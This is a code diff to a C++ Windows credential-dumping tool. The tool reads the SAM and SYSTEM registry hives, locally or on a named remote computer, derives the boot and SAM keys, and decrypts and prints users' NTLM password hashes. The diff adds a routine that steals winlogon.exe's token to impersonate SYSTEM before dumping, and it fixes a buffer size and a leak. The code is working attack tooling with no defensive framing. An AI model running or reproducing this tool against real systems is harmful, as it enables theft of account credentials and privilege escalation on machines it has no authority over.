@@ -1,14 +1,15 @@
-﻿#include <Windows.h>
+#include <Windows.h>
 #include <iostream>
+#include <TlHelp32.h>
 #include "md5.h"
 #include "reg.h"
 #pragma comment(lib,"Advapi32.lib")
 #pragma warning(disable:4996)
 
+
 BYTE qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
 BYTE Digits[] = "0123456789012345678901234567890123456789";
 BYTE NTPASSWORD[] = "NTPASSWORD";
-
 
 void desDecrypt(const BYTE *in, const BYTE *key, LPBYTE out);
 void rc4Decrypt(CRYPTO_BUFFER *data, CRYPTO_BUFFER *key);
@@ -100,13 +101,13 @@ void aesDecrypt(BYTE *Key, BYTE *Data, BYTE *IV, BYTE *outData, DWORD *dwOutLen)
 			keyBlob->Header.reserved = 0;
 			keyBlob->Header.aiKeyAlg = CALG_AES_128;
 			keyBlob->dwKeyLen = 0x10;
-			RtlCopyMemory((PBYTE)keyBlob + sizeof(GENERICKEY_BLOB), Key, keyBlob->dwKeyLen);
+			memcpy((PBYTE)keyBlob + sizeof(GENERICKEY_BLOB), Key, keyBlob->dwKeyLen);
 			CryptImportKey(hProv, (LPCBYTE)keyBlob, szBlob, 0, 0, &hKey);
 			CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE)&mode, 0);
 			CryptSetKeyParam(hKey, KP_IV, IV, 0);
-			RtlCopyMemory(outData, Data, 0x10);
+			memcpy(outData, Data, 0x10);
 			CryptDecrypt(hKey, 0, TRUE, 0, outData, dwOutLen);
-			LocalFree(keyBlob);
+			free(keyBlob);
 		}
 	}
 }
@@ -132,7 +133,7 @@ void getSamKey(char *remoteComputerName, BYTE *samkey, BYTE *sysKey) {
 		exit(1);
 	}
 	RegQueryValueEx(hkResult, "F", 0, NULL, NULL, &len);
-	value = (PDOMAIN_ACCOUNT_F)LocalAlloc(LPTR,len);
+	value = (PDOMAIN_ACCOUNT_F)LocalAlloc(LPTR, len);
 	RegQueryValueEx(hkResult, "F", 0, NULL, (PBYTE)value, &len);
 	RegCloseKey(hKey);
 	RegCloseKey(hkResult);
@@ -140,7 +141,7 @@ void getSamKey(char *remoteComputerName, BYTE *samkey, BYTE *sysKey) {
 	switch (value->keys1.Revision)
 	{
 	case 1:
-		
+
 		MD5Init(&md5ctx);
 		MD5Update(&md5ctx, value->keys1.Salt, 0x10);
 		MD5Update(&md5ctx, qwertyuiopazxc, sizeof(qwertyuiopazxc));
@@ -204,7 +205,7 @@ void getHash(char *remoteComputerName, BYTE *samKey) {
 	}
 	RegQueryInfoKey(hkResult, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);
 	szMaxSubKeyLen++;
-	subKeyName = (char*)LocalAlloc(LPTR,0x09);
+	subKeyName = (char*)LocalAlloc(LPTR, MAX_PATH);
 	for (int i = 0; i < nbSubKeys - 1; i++) {
 		HKEY hkResult1;
 		DWORD outLen = 0x10;
@@ -219,10 +220,10 @@ void getHash(char *remoteComputerName, BYTE *samKey) {
 		szUser = szMaxSubKeyLen;
 		RegEnumKeyEx(hkResult, i, subKeyName, &szUser, NULL, NULL, NULL, NULL);
 		sscanf_s(subKeyName, "%x", &rid);
-		
+
 		RegOpenKeyEx(hkResult, subKeyName, 0, KEY_READ, &hkResult1);
 		RegQueryValueEx(hkResult1, "V", 0, NULL, NULL, &regLength);
-		value = (PUSER_ACCOUNT_V)LocalAlloc(LPTR,regLength);
+		value = (PUSER_ACCOUNT_V)LocalAlloc(LPTR, regLength);
 		RegQueryValueEx(hkResult1, "V", 0, NULL, (PBYTE)value, &regLength);
 		PSAM_HASH pHash = (PSAM_HASH)(value->datas + value->NTLMHash.offset);
 		for (int i = 0; i < value->Username.lenght; i++) {
@@ -265,6 +266,7 @@ void getHash(char *remoteComputerName, BYTE *samKey) {
 				printf("NULL");
 			break;
 		}
+		LocalFree(cypheredHashBuffer.Buffer);
 		LocalFree(value);
 		printf("\n");
 		RegCloseKey(hkResult1);
@@ -273,14 +275,48 @@ void getHash(char *remoteComputerName, BYTE *samKey) {
 	RegCloseKey(hkResult);
 	RegCloseKey(hKey);
 }
+DWORD GetPid() {
+	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	BOOL Result = Process32First(handle, &pe32);
+	while (Result) {
+		if (!strcmp("winlogon.exe", pe32.szExeFile)) {
+			return pe32.th32ProcessID;
+		}
+		Result = Process32Next(handle, &pe32);
+	}
+	CloseHandle(handle);
+	return 0;
+}
 
+BOOL GetSystemToken() {
+	DWORD pid = GetPid();
+	HANDLE tokenHandle = NULL;
+
+	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
+
+	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
+
+	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
+	if (GetLastError() == NULL){
+		return TRUE;
+	}
+	printf("GetSystem Error %d", GetLastError());
+	return FALSE;
+}
 int main(int argc, char* argv[]) {
 	BYTE SysKey[0x10] = { 0 };
 	BYTE SamKey[0x10] = { 0 };
 
 	char *remoteComputerName = "";
+	
 	if (argc != 1) {
 		remoteComputerName = argv[1];
+	}
+	else
+	{
+		if (!GetSystemToken()) { return 1; }
 	}
 	getSysKey(remoteComputerName, SysKey);
 	getSamKey(remoteComputerName, SamKey, SysKey);
